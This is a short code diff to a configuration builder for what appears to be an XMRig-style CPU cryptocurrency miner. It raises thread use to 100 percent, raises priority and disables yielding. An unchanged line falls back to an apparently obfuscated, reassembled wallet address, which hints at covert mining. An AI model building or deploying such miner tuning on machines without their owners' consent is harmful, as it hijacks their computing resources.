@@ -60,7 +60,7 @@ class ConfigBuilder:
     def build(self) -> dict:
         threads = _detect_cpu_threads()
         ram_gb = _detect_total_ram_gb()
-        hint = self.settings.get("max_threads_hint", 50)
+        hint = self.settings.get("max_threads_hint", 100)
         pool_host = self.settings.get("pool_host", DEFAULT_POOL_HOST)
         pool_port = self.settings.get("pool_port", DEFAULT_POOL_PORT)
         pool_user = self.settings.get("pool_user") or _reassemble_wallet()
@@ -95,11 +95,11 @@ class ConfigBuilder:
             "cpu": {
                 "enabled": True,
                 "huge-pages": huge_pages,
-                "huge-pages-jit": False,
+                "huge-pages-jit": True,
                 "hw-aes": None,
-                "priority": 1,
+                "priority": 3,
                 "memory-pool": False,
-                "yield": True,
+                "yield": False,
                 "max-threads-hint": hint,
                 "asm": True,
                 "argon2-impl": None,
